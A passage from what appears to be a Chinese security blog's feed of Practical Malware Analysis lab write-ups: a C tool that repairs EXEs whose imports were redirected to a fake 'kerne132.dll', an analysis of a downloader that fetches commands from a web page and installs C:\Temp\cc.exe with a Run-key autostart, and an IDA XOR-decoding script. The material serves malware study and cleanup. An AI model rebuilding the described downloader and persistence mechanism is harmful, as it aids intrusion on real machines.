operator">==</span> INVALID_SET_FILE_POINTER <span class="token operator">||</span>        <span class="token operator">!</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ntHeader<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ntHeader<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">||</span>         bytesRead <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ntHeader<span class="token punctuation">)</span> <span class="token operator">||</span>         ntHeader<span class="token punctuation">.</span>Signature <span class="token operator">!=</span> IMAGE_NT_SIGNATURE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"无效的 PE 文件：%s（NT 头损坏）\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exePath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> cleanup<span class="token punctuation">;</span> <span class="token comment">// 读取失败，跳转到 cleanup</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 4. 定位导入表</span>    IMAGE_DATA_DIRECTORY importDir <span class="token operator">=</span> ntHeader<span class="token punctuation">.</span>OptionalHeader<span class="token punctuation">.</span>DataDirectory<span class="token punctuation">[</span>IMAGE_DIRECTORY_ENTRY_IMPORT<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>importDir<span class="token punctuation">.</span>VirtualAddress <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> importDir<span class="token punctuation">.</span>Size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"跳过无导入表的文件：%s\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exePath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> cleanup<span class="token punctuation">;</span> <span class="token comment">// 无导入表，跳转到 cleanup</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 5. 将 RVA 转换为文件偏移</span>    DWORD importFileOffset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    IMAGE_SECTION_HEADER sectionHeader<span class="token punctuation">;</span>    DWORD sectionTableOffset <span class="token operator">=</span> dosHeader<span class="token punctuation">.</span>e_lfanew <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>IMAGE_NT_HEADERS32<span class="token punctuation">)</span><span class="token punctuation">;</span>    BOOL foundSection <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>WORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> ntHeader<span class="token punctuation">.</span>FileHeader<span class="token punctuation">.</span>NumberOfSections<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">SetFilePointer</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> sectionTableOffset <span class="token operator">+</span> i <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>IMAGE_SECTION_HEADER<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> FILE_BEGIN<span class="token punctuation">)</span> <span class="token operator">==</span> INVALID_SET_FILE_POINTER <span class="token operator">||</span>            <span class="token operator">!</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sectionHeader<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sectionHeader<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">||</span>            bytesRead <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sectionHeader<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"读取节表失败：%s（节索引：%d）\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exePath<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">goto</span> cleanup<span class="token punctuation">;</span> <span class="token comment">// 读取失败，跳转到 cleanup</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>importDir<span class="token punctuation">.</span>VirtualAddress <span class="token operator">>=</span> sectionHeader<span class="token punctuation">.</span>VirtualAddress <span class="token operator">&amp;&amp;</span>            importDir<span class="token punctuation">.</span>VirtualAddress <span class="token operator">&lt;</span> sectionHeader<span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> sectionHeader<span class="token punctuation">.</span>SizeOfRawData<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            importFileOffset <span class="token operator">=</span> importDir<span class="token punctuation">.</span>VirtualAddress <span class="token operator">-</span> sectionHeader<span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> sectionHeader<span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">;</span>            foundSection <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>foundSection<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"未找到导入表所在节：%s\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exePath<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> cleanup<span class="token punctuation">;</span> <span class="token comment">// 未找到，跳转到 cleanup</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 6. 遍历导入表并修复恶意 DLL</span>    IMAGE_IMPORT_DESCRIPTOR importDesc<span class="token punctuation">;</span>    BOOL repaired <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>    DWORD currentOffset <span class="token operator">=</span> importFileOffset<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>TRUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">SetFilePointer</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> currentOffset<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> FILE_BEGIN<span class="token punctuation">)</span> <span class="token operator">==</span> INVALID_SET_FILE_POINTER <span class="token operator">||</span>            <span class="token operator">!</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>importDesc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>importDesc<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">||</span>            bytesRead <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>importDesc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"读取导入描述符失败：%s（偏移：%d）\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exePath<span class="token punctuation">,</span> currentOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// 这里 break 出 while 循环，之后会走到 cleanup</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>importDesc<span class="token punctuation">.</span>Name <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> importDesc<span class="token punctuation">.</span>FirstThunk <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token comment">// 遍历结束</span>        <span class="token punctuation">&#125;</span>        DWORD dllNameRVA <span class="token operator">=</span> importDesc<span class="token punctuation">.</span>Name<span class="token punctuation">;</span>        DWORD dllNameFileOffset <span class="token operator">=</span> dllNameRVA <span class="token operator">-</span> sectionHeader<span class="token punctuation">.</span>VirtualAddress <span class="token operator">+</span> sectionHeader<span class="token punctuation">.</span>PointerToRawData<span class="token punctuation">;</span>        <span class="token keyword">char</span> dllName<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">SetFilePointer</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> dllNameFileOffset<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> FILE_BEGIN<span class="token punctuation">)</span> <span class="token operator">==</span> INVALID_SET_FILE_POINTER <span class="token operator">||</span>            <span class="token operator">!</span><span class="token function">ReadFile</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> dllName<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>dllName<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">||</span>            bytesRead <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"读取 DLL 名称失败：%s（偏移：%d）\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exePath<span class="token punctuation">,</span> dllNameFileOffset<span class="token punctuation">)</span><span class="token punctuation">;</span>            currentOffset <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>IMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        dllName<span class="token punctuation">[</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>dllName<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_stricmp</span><span class="token punctuation">(</span>dllName<span class="token punctuation">,</span> <span class="token string">"kerne132.dll"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            TCHAR backupPath<span class="token punctuation">[</span>MAX_PATH_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> correctDllName <span class="token operator">=</span> <span class="token string">"kernel32.dll"</span><span class="token punctuation">;</span>            DWORD correctNameLen <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>correctDllName<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">SetFilePointer</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> dllNameFileOffset<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> FILE_BEGIN<span class="token punctuation">)</span> <span class="token operator">==</span> INVALID_SET_FILE_POINTER <span class="token operator">||</span>                <span class="token operator">!</span><span class="token function">WriteFile</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> correctDllName<span class="token punctuation">,</span> correctNameLen<span class="token punctuation">,</span> <span class="token operator">&amp;</span>bytesRead<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token operator">||</span>                bytesRead <span class="token operator">!=</span> correctNameLen<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"修复 DLL 名称失败：%s（错误码：%d）\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exePath<span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                repaired <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        currentOffset <span class="token operator">+=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>IMAGE_IMPORT_DESCRIPTOR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      result <span class="token operator">=</span> repaired<span class="token punctuation">;</span><span class="token comment">// 7.回收资源</span>cleanup<span class="token operator">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hFile <span class="token operator">!=</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hFile<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//释放内存</span><span class="token keyword">void</span> <span class="token function">FreeEXEList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> g_exeCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>g_exeList<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">free</span><span class="token punctuation">(</span>g_exeList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            g_exeList<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    g_exeCount <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"\n按回车键退出..."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">_tmain</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"============= PE 文件修复工具（WinXP 32位专用）=============\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"功能：扫描 C 盘所有 EXE 文件，修复导入表中恶意的 kerne132.dll\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"===========================================================\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"开始扫描 C 盘 EXE 文件...\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ScanEXE</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"C:\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"\n扫描完成！共找到 %d 个 EXE 文件，开始修复...\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> g_exeCount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> g_exeCount<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>g_exeList<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">RepairPE</span><span class="token punctuation">(</span>g_exeList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">SafeLog</span><span class="token punctuation">(</span><span class="token function">_T</span><span class="token punctuation">(</span><span class="token string">"\n修复任务完成！\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">FreeEXEList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>鉴于笔者在高版本主机中编译的该段程序，为了与winXP兼容，编译命令如下</p><pre class="line-numbers language-gcc" data-language="gcc"><code class="language-gcc">gcc -o repair.exe repair.c -m32 -DWINVER&#x3D;0x0501 -D_WIN32_WINNT&#x3D;0x0501 -static-libgcc -static-libstdc++ -luser32 -lkernel32 -ladvapi32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中的 <code>-DWINVER=0x0501 -D_WIN32_WINNT=0x0501</code>用于指定windows平台为XP。接下来在XP虚拟机中执行修复程序</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763802571721.png" alt="执行修复程序"></p><p>修复后再次查看C盘中的exe文件依赖项，发现已经被修复为了系统库Kernel32.dll</p><p><img src="/2025/11/22/e-yi-dai-ma-fen-xi-shi-zhan-lab7/1763802578245.png" alt="修复后的依赖"></p><p>至此，本次实验圆满结束</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 恶意代码分析实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析实战Lab6</title>
      <link href="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/"/>
      <url>/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/</url>
      
        <content type="html"><![CDATA[<p><strong>本次实验中的前两个程序在分析后发现是后两个程序的功能简化版，因此我们仅对后两个结构不同的实验程序进行分析</strong></p><h3 id="Lab06-03"><a href="#Lab06-03" class="headerlink" title="Lab06-03"></a>Lab06-03</h3><p>首先分析main函数中调用的几个函数</p><p>（1）sub_401271</p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/1763715890008.png" alt="函数参数"></p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/1763715907251.png" alt="函数细节"></p><p>可以看到在调用前压入了字符串<strong>Success:xxx</strong>作为参数，在调用过程中又设置了缓冲区等，我们合理推断该函数为printf函数</p><p>（2）sub_401000</p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/1763716257191.png" alt="函数细节"></p><p>发现函数在 <code>call InternetGetConnectedState</code>后，将结果与0进行比较，并且根据不同的返回结果print两个字符串，由此推断，该函数用于判断当前设备网络连接状态</p><p>（3）sub_401040</p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/1763716553019.png" alt="构建http请求"></p><p>首先构造http请求，并尝试连接”<a href="http://www.practicalmalwareanalysis.com/">http://www.practicalmalwareanalysis.com</a>“</p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/1763716674815.png" alt="判断前4字节是否相同"></p><p>其次从该网址中下载512字节数据并判断数组首位4字节是否为**&lt;!–**</p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/1763718778393.png" alt="返回值"></p><p>如果是，便返回网页中的第五个字节。可以总结出该函数用于从远程网络连接中下载并判断数据</p><p>（4）sub_401130</p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/1763718977347.png" alt="函数的switch结构"></p><p>通过图标结构可以得知该函数使用了switch结构，接下来我们依次分析各个case</p><p>‘a’:创建目录”C:\Temp”</p><p>‘b’:将lpExistingFileName中的文件资源copy到”C:\Temp\cc.exe”</p><p>‘c’:删除”C:\Temp\cc.exe”文件</p><p>‘d’:向注册表中写入键值对，将”C:\Temp\cc.exe”设置为自启动项，</p><p>‘e’:程序休眠100s</p><p>通过对这个switch结构的分析，我们可以了解这个函数的具体作用了——用于将远程获取的恶意程序拷贝到本地，并且设置为开机自启</p><p>至此我们的程序大体流程便分析完毕了。总结一下，这个程序的作用从连接远程，获取恶意程序，并且设置为开机自启，后续可能会进行远程连接等一系列控制操作</p><h3 id="Lab06-04"><a href="#Lab06-04" class="headerlink" title="Lab06-04"></a>Lab06-04</h3><p>该程序的大体功能与<strong>Lab06-03</strong>相似，不过多了一个循环结构，接下来我们对这两个程序间的不同进行具体分析</p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/1763719679642.png" alt="main函数流程图"></p><p>由大体的流程图可以发现，在原先<strong>Lab06-03</strong>的流程走完以后，这里将会跳转回函数开头进行循环，下述为循环代码</p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/1763719787968.png" alt="循环代码"></p><p>分析可得，此处将会循环1440次，又因为每次流程都会sleep60s，可以相乘得出此程序完整运行完需要一天</p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/1763719911055.png" alt="多出的参数"></p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab6/1763719916072.png" alt="Agent每次不同"></p><p>同时我们可以看到，原先的下载远程资源的函数多出了一个参数i，用于记录循环次数并且修改UserAgent的值，使得每次http请求从不同的Agent发出。</p><p>至此该次实验中的恶意程序已经分析完毕</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 恶意代码分析实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析实战Lab5</title>
      <link href="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab5/"/>
      <url>/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab5/</url>
      
        <content type="html"><![CDATA[<h3 id="Lab05-01"><a href="#Lab05-01" class="headerlink" title="Lab05-01"></a>Lab05-01</h3><p>本次实验主要聚焦于IDApro的基本操作，因此只记录最后的脚本操作范例</p><p>观察python脚本，可以得知脚本作用为解密0x50长度的字符串</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">sea <span class="token operator">=</span> ScreenEA<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        b <span class="token operator">=</span> Byte<span class="token punctuation">(</span>sea<span class="token operator">+</span>i<span class="token punctuation">)</span>        decoded_byte <span class="token operator">=</span> b <span class="token operator">^</span> <span class="token number">0x55</span>        PatchByte<span class="token punctuation">(</span>sea<span class="token operator">+</span>i<span class="token punctuation">,</span>decoded_byte<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但由于python脚本环境配置有些许麻烦，笔者在此不使用python语言，而是使用IDApro原生脚本语言idc进行相同操作</p><pre class="line-numbers language-idc" data-language="idc"><code class="language-idc">#include &lt;idc.idc&gt;static main()&#123;auto ea&#x3D;ScreenEA(),b,i,decoded_byte;for(i&#x3D;0x0;i&lt;0x50;i++)&#123;b&#x3D;Byte(ea+i);decoded_byte&#x3D;b^0x55;PatchByte(ea+i,decoded_byte);&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本语言感觉与C语言很相似，没有太大的理解难度，下面我们执行脚本，可以见到原先的字符串成功解密</p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab5/1763656869277.png" alt="解密前字符串"></p><p><img src="/2025/11/21/e-yi-dai-ma-fen-xi-shi-zhan-lab5/1763656899121.png" alt="解密后字符串"></p><p>脚本文件示例结束</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 恶意代码分析实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意代码分析实战Lab3</title>
      <link href="/2025/11/19/e-yi-dai-ma-fen-xi-shi-zhan-lab3/"/>
      <url>/2025/11/19/e-yi-dai-ma-fen-xi-shi-zhan-lab3/</url>
      
